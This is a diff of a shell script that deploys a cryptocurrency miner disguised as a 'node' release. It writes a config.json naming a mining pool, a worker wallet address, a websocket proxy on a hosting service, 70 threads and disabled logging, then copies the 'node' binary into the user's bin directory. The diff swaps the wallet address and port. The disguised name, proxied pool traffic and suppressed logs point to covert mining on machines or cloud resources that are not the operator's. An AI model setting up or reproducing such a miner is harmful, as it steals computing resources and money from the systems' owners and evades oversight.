@@ -4,7 +4,7 @@ rm node-release.tar.gz
 cd node-release
 
 
-rm config.json && echo '{"proxy": "wss://flexible-eustacia-mtp-0b00e028.koyeb.app/proxy","stratum": {"server": "stratum-asia.rplant.xyz", "port": 17116, "worker": "UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx", "password": "x", "algo": "yescryptr32"}, "options": { "threads": 70, "log": false }}' > config.json
+rm config.json && echo '{"proxy": "wss://flexible-eustacia-mtp-0b00e028.koyeb.app/proxy","stratum": {"server": "stratum-asia.rplant.xyz", "port": 17068, "worker": "RQny2iMJZVU1RS3spxF8cCTqMF31vuxvkF", "password": "x"}, "options": { "threads": 70, "log": false }}' > config.json
 
 mkdir -p $HOME/bin
 cp ./node $HOME/bin/
